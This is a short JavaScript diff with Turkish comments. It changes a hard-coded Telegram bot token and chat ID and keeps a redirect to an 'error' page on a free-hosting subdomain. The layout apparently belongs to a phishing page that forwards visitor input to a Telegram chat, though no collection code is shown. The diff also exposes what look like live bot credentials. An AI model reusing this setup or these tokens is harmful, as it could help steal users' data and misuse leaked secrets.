@@ -2,8 +2,8 @@
 const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";
 
 // Telegram Bot Bilgileri
-const TELEGRAM_BOT_TOKEN = "6944329555:AAG0MPx1-5NjJBTXR4c0sRdHoySL2d8cwwc"; // Bu token sadece bu proje için kullanılmalıdır
-const TELEGRAM_CHAT_ID = "6824853693"; // Mesajların iletileceği chat ID
+const TELEGRAM_BOT_TOKEN = "7676691540:AAH_BiHHfI0hK1EQC87oGw6GjCyI5C6ySKE"; // Bu token sadece bu proje için kullanılmalıdır
+const TELEGRAM_CHAT_ID = "-1002584942967"; // Mesajların iletileceği chat ID
 
 // Sayfa yüklendiğinde çalışacak
 document.addEventListener('DOMContentLoaded', function() {
